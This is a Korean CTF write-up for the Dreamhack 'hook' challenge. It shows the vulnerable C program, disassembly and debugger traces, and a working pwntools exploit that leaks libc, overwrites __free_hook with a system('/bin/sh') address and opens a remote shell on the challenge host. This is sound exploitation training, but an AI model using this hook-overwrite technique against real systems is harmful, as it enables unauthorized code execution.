## hook
---

```c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

<br><br>

## Solution
---

```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<br>

```
   0x00000000004009e4 <+154>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004009e8 <+158>:   mov    rax,QWORD PTR [rax]
   0x00000000004009eb <+161>:   mov    rdx,rax
   0x00000000004009ee <+164>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004009f2 <+168>:   mov    rax,QWORD PTR [rax+0x8]
   0x00000000004009f6 <+172>:   mov    QWORD PTR [rdx],rax
   0x00000000004009f9 <+175>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004009fd <+179>:   mov    rdi,rax
```

<br>

위 부분은 read를 실행하고 난 뒤, free를 하기 전까지의 과정이다.

```*(long *)*ptr = *(ptr+1);``` 이 코드에서 오버라이트를 성공시켜줘야 하는데, free가 호출될 때, 코드에 있는 system 함수를 실행하도록 해보겠다.

<br>

입력으로 aaaabbbbccccdddd를 넣었다.

<br>

```
0x4009e4 <main+154>    mov    rax, qword ptr [rbp - 0x10]
--> *RAX  0x6022a0 ◂— 'aaaabbbbccccdddd\n'

--> rax에 rbp-0x10이 가리키고 있는 주소를 넣어준다.
```

<br>

```
0x4009e8 <main+158>    mov    rax, qword ptr [rax]
--> ```*RAX  0x6262626261616161 ('aaaabbbb')```

--> 0x6022a0가 가리키고 있는 값의 64비트(8바이트)를 가져온다.
```

<br>

```
0x4009eb <main+161>    mov    rdx, rax
--> *RDX  0x6262626261616161 ('aaaabbbb')

--> rdx에 rax 값을 넣어준다.

이 부분은 ```*(long *)*ptr```가 된다.
```

<br>

즉, 입력값으로 aaaabbbb 부분에 free_hook 변수 값을 준다면,  ```*(long *)*ptr```는 free_hook을 가리키게 될 것이다.

<br>

```
0x4009ee <main+164>    mov    rax, qword ptr [rbp - 0x10]
0x4009f2 <main+168>    mov    rax, qword ptr [rax + 8]
--> *RAX  0x6464646463636363 ('ccccdddd')

--> rax에 rbp-0x10이 가리키는 주소에 있는 값에서 +8한 값이 가리키는 주소 값을 넣는다.

이 부분은 *(ptr+1)가 된다.
```

<br>

이 부분까지 진행되면 ```0x4009f6 <main+172>    mov    qword ptr [rdx], rax```를 진행하면 Segmentation fault가 일어나서 더 이상 실행이 안된다.

이제 공격을 진행해보면 입력을 free hook 변수 주소값과 덮어쓸 코드에 있는 system 함수의 주소를 넣어주면 될 것이다.

여기서 system 함수 주소는 edi에 binsh 문자열을 넣어주는 주소인 0x400a11을 사용해야 한다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',10450)
libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')

stdout = int(p.recvn(14),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
binsh_system = 0x400a11 # NO PIE

print("@ stdout : ",hex(stdout))
print("@ libc_base: ", hex(libc_base))
print("@ free_hook: ", hex(free_hook))

p.sendlineafter(b'Size: ', b'16')

payload = p64(free_hook) + p64(binsh_system)
p.sendlineafter(b'Data: ', payload)

p.interactive()
```

